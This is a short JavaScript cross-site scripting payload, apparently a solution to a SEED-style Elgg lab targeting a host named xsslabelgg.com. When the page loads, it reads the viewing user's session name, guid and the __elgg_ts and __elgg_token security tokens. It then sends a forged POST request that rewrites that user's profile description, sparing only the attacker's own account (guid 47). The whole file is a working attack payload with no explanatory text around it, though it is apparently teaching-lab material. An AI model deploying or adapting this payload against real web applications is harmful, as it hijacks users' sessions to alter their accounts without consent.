window.onload=function()
{
    //JavaScript code to access uer name, user guid, Time Stamp, __elgg_ts
    //and Security Token __elgg_token
    var userName=elgg.session.user.name;
    var guid="&guid="+elgg.session.user.guid;
    var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
    var token="&__elgg_token="+elgg.security.token.__elgg_token;
    var desc = "&description=Anurag.R.Simha+is+my+Hero"+"&accesslevel[description]=2";
    var name="&name="+userName;
    //Construct the content of the url
    var sendurl="http://www.xsslabelgg.com/action/profile/edit";
    var content=token+ts+name+desc+guid;
    //FILL-IN
    var samyGuid=47;
    //FILL-IN
    if(elgg.session.user.guid!=samyGuid)
    {
        //create and send Ajax request to modify profile
        var Ajax=null;
        Ajax=new XMLHttpRequest();
        Ajax.open("POST",sendurl,true);
        Ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
        Ajax.send(content);
    }
}